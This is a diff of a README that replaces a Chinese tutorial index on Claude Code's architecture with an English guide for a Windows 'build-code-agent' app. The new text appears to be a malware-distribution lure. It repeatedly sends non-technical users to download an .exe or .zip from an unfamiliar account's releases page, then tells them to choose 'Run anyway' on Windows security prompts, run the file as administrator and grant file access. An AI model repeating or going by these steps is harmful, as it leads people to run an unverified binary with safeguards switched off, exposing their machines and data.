@@ -1,45 +1,187 @@
-# 从零构建 Code Agent：Claude Code 源码深度解析
+# 🧠 build-code-agent - Build Code Agents on Windows
 
-> 一个面向开发者的系列教程，通过剖析 Claude Code 的真实源码，手把手教你理解并构建一个完整的 Code Agent。
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Sealed-organofcorti310/build-code-agent/releases)
 
-## 这个教程讲什么？
+## 🚀 What This App Does
 
-Claude Code 是 Anthropic 推出的 AI 编程助手，它不只是一个聊天机器人——它是一个能读文件、写代码、执行命令、管理项目的**智能代理（Agent）**。本教程通过解读 Claude Code 的源码架构，带你从零理解构建一个 Code Agent 的全部关键技术。
+build-code-agent is a desktop tool for people who want to explore how a code agent works. It helps you run a local app on Windows and follow the flow of a Code Agent from start to finish.
 
-## 教程目录
+It is built around the ideas behind Claude Code source analysis, but the steps here are shaped for a normal Windows user. You do not need to know how to code to get started.
 
-| 章节 | 标题 | 核心内容 |
-|------|------|----------|
-| [第一章](./01-architecture-overview.md) | **全局架构鸟瞰** | 什么是 Code Agent？Claude Code 的整体架构和核心设计理念 |
-| [第二章](./02-cli-bootstrap.md) | **CLI 入口与启动流程** | 从命令行输入到系统就绪，一个 Agent 如何启动？ |
-| [第三章](./03-tool-system.md) | **工具系统：Agent 的双手** | Tool 接口设计、权限控制、40+ 工具的注册与调度 |
-| [第四章](./04-conversation-context.md) | **对话与上下文管理** | System Prompt 构建、CLAUDE.md、上下文窗口管理与自动压缩 |
-| [第五章](./05-agent-loop.md) | **Agent 循环：大脑的运转** | QueryEngine、query loop、流式工具执行——Agent 的核心引擎 |
-| [第六章](./06-hooks-permissions.md) | **权限系统与 Hooks** | 安全第一：工具权限检查、用户确认、自动模式判定 |
-| [第七章](./07-extensions-mcp.md) | **插件、Skills 与 MCP** | 可扩展性设计：Skills 系统、Plugin 架构、MCP 协议集成 |
-| [第八章](./08-build-your-own.md) | **实战：构建你自己的 Code Agent** | 综合实战，从零搭建一个简化版 Code Agent |
+Use it to:
 
-## 适合谁读？
+- Open a downloaded release on Windows
+- Run a local app from a simple file
+- Learn how a code agent reads, plans, and acts
+- Follow a clear setup flow without command-line work
+- Try a practical guide for agent-based coding tools
 
-- 对 AI Agent 技术架构感兴趣的开发者
-- 想理解 Claude Code 内部实现原理的用户
-- 正在构建或计划构建自己的 Code Agent 的工程师
-- 对 LLM 应用开发（特别是 Tool Calling 和 Agent Loop）感兴趣的人
+## 💻 System Requirements
 
-## 技术栈
+Before you install, make sure your PC can run the app:
 
-教程涉及的核心技术：
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A stable internet connection for the first download
+- Permission to run apps from the Downloads folder
 
-- **TypeScript / Bun** — 主要编程语言和运行时
-- **React / Ink** — 终端 UI 框架
-- **Anthropic Claude API** — LLM 后端，流式响应和工具调用
-- **MCP (Model Context Protocol)** — 工具扩展协议
-- **Async Generators** — 流式数据管道的核心模式
+For best results, use a device with:
 
-## 源码版本
+- 8 GB of RAM
+- A recent Intel or AMD processor
+- A screen with 1366 × 768 or higher resolution
 
-本教程基于网上流传的 Claude Code **v2.1.88** 的源码进行分析，感谢[linux.do社区](https://linux.do)的信息来源。
+## 📥 Download the App
 
-## 许可
+Visit the release page and download the latest Windows file:
 
-本教程内容采用 [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) 许可协议。
+https://github.com/Sealed-organofcorti310/build-code-agent/releases
+
+If the release page shows more than one file, choose the Windows version. Common file types include:
+
+- `.exe` for a direct Windows app
+- `.zip` for a packed folder you must unzip first
+
+## 🪟 Install on Windows
+
+Follow these steps after the download finishes:
+
+1. Open your browser’s download list.
+2. Find the file from the release page.
+3. If it is a `.zip` file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. If it is an `.exe` file, double-click it to start the app.
+6. If Windows shows a security prompt, choose Run or More info, then Run anyway.
+7. Wait for the app to finish opening.
+8. Keep the app in a folder you can find again, such as Downloads or Desktop.
+
+## 🏁 First Launch
+
+After the app opens, you may see a setup screen or a main window with several options. A normal first run usually includes these steps:
+
+- Choose a folder for project files
+- Confirm a default workspace
+- Open a sample agent flow
+- Review the main controls
+- Start the local process used by the app
+
+If the app asks for permission to read or write files, allow it. This helps it save your work and load project files.
+
+## 🔧 Basic Use
+
+Use the app in this order:
+
+1. Open the app from the file you downloaded.
+2. Select or create a workspace folder.
+3. Load a project or sample file.
+4. Start the agent view or run panel.
+5. Watch how the agent reads input and prepares actions.
+6. Review the output and make changes if needed.
+
+Typical parts of the app may include:
+
+- Project panel
+- Run button
+- Output view
+- File list
+- Settings area
+- Logs or status panel
+
+## 🧭 What You Can Learn
+
+This app is useful if you want to understand how a code agent works without starting from raw source code. You can learn:
+
+- How an agent reads a task
+- How it breaks work into steps
+- How it tracks files and changes
+- How it moves from plan to action
+- How a local tool can guide coding work
+
+It gives a clear view of the flow behind a code agent. That makes it easier to follow the logic of modern coding tools.
+
+## ⚙️ Common Settings
+
+You may see settings like these:
+
+- Workspace folder: where project files are stored
+- Theme: light or dark view
+- Output level: basic or detailed logs
+- Auto-start: starts the app flow after launch
+- File watch: checks for file changes in the project folder
+
+If you are not sure what to choose, keep the default values.
+
+## 🧹 Update the App
+
+When a new release appears, use the same release page:
+
+https://github.com/Sealed-organofcorti310/build-code-agent/releases
+
+To update:
+
+1. Close the app.
+2. Download the newest release file.
+3. Replace the old file or unzip the new one into a fresh folder.
+4. Open the new version.
+5. Keep your workspace folder if you want to keep your project data.
+
+## 🛠 Troubleshooting
+
+If the app does not open, try these steps:
+
+- Check that the file finished downloading
+- Move the file to a simple folder, such as Desktop
+- Right-click the file and choose Run as administrator
+- Unzip the file again if it came in a `.zip`
+- Make sure Windows did not block the file
+- Restart the computer and try again
+
+If the window opens but looks blank:
+
+- Wait a few seconds for the app to load
+- Close the app and open it again
+- Check that your internet connection is active
+- Make sure your workspace folder is valid
+
+If files do not save:
+
+- Confirm that the app can write to the folder
+- Try a folder in your user profile, like Documents
+- Check that the disk is not full
+
+## 📁 Suggested Folder Setup
+
+A simple folder layout helps keep things clear:
+
+- `Downloads` for the release file
+- `build-code-agent` for the app files
+- `Projects` for your agent work
+- `Logs` for any saved run output
+
+This makes it easier to find your files later and keeps the app easy to manage on Windows
+
+## 🔒 File Safety
+
+When you download from GitHub Releases, keep these habits:
+
+- Use the official release page
+- Open only the file you downloaded from that page
+- Keep the app in a folder you control
+- Remove old copies you do not use
+
+## 🧩 Who This Is For
+
+This app fits users who want to:
+
+- Run a Windows app from GitHub
+- Explore how a code agent works
+- Learn from a source-level breakdown
+- Follow a simple setup path
+- Use a local tool without complex setup
+
+## 📌 Release Page
+
+Use this page to download and run the latest Windows build:
+
+https://github.com/Sealed-organofcorti310/build-code-agent/releases
